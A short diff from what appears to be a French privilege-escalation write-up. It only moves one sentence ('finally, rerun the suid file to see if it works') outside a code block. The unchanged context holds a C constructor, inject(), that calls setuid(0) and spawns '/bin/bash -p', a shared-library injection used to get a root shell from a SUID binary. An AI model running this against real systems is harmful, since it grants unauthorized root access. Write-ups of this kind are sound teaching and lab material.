@@ -24,6 +24,7 @@ static void inject() **attribute**((constructor));
 void inject() {  
         setuid(0);  
         system("/bin/bash -p");  
-}  
-Enfin, on relance le fichier suid pour voir si ca marche.
+}
 ```
+Enfin, on relance le fichier suid pour voir si ca marche.
+
